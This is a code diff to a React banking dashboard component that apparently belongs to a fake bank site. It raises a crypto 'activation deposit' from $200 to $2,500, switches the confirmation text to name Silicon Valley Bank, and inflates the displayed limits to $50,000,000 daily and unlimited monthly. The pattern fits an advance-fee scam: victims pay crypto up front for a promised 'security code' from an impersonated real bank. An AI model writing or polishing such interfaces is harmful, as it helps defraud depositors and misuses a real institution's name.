@@ -75,7 +75,7 @@ export const UserDashboard: React.FC<UserDashboardProps> = ({
       const res = await api.submitCryptoActivationDeposit(cryptoMethod, txHash, proofNote);
       if (onUserUpdated) onUserUpdated(res.user);
       setShowActivationModal(false);
-      alert('$200 Activation deposit request submitted successfully! SVB Compliance will review and generate your 4-Digit Security Code upon approval.');
+      alert('$2,500 Activation deposit request submitted successfully! Silicon Valley Bank will review and generate your 4-Digit Security Code upon approval.');
     } catch (err: any) {
       setActivationError(err.message || 'Failed to submit activation deposit.');
     } finally {
@@ -109,7 +109,7 @@ export const UserDashboard: React.FC<UserDashboardProps> = ({
                 </span>
               </div>
               <p className="text-xs text-slate-400 mt-1">
-                Account Tier: <span className="font-bold text-cyan-400">Tier 3</span> • Monthly Spending Limit: <span className="font-bold text-emerald-400">$5,000,000.00 USD</span> (Unlimited).
+                Account Tier: <span className="font-bold text-cyan-400">Tier 3</span> • Daily Limit: <span className="font-bold text-amber-400">$50,000,000.00 USD</span> • Monthly Limit: <span className="font-bold text-emerald-400">Unlimited</span>.
               </p>
             </div>
           </div>
@@ -478,13 +478,25 @@ export const UserDashboard: React.FC<UserDashboardProps> = ({
           </div>
 
           <div className="p-4 bg-slate-950/80 border border-slate-800/80 rounded-2xl flex items-center gap-3">
+            <div className="w-9 h-9 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-amber-400 shrink-0">
+              <TrendingUp className="w-4 h-4" />
+            </div>
+            <div className="overflow-hidden">
+              <p className="text-[10px] text-slate-400 font-medium">Daily Spending Limit</p>
+              <p className="font-bold text-amber-400">
+                {user.verificationTier === 'Tier 3' ? '$50,000,000.00' : '$50,000.00'}
+              </p>
+            </div>
+          </div>
+
+          <div className="p-4 bg-slate-950/80 border border-slate-800/80 rounded-2xl flex items-center gap-3">
             <div className="w-9 h-9 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center text-emerald-400 shrink-0">
               <TrendingUp className="w-4 h-4" />
             </div>
             <div className="overflow-hidden">
               <p className="text-[10px] text-slate-400 font-medium">Monthly Spending Limit</p>
               <p className="font-bold text-emerald-400">
-                {user.verificationTier === 'Tier 3' ? '$5,000,000.00' : user.verificationTier === 'Tier 2' ? '$250,000.00' : '$50,000.00'}
+                {user.verificationTier === 'Tier 3' ? 'Unlimited' : '$1,000,000.00'}
               </p>
             </div>
           </div>
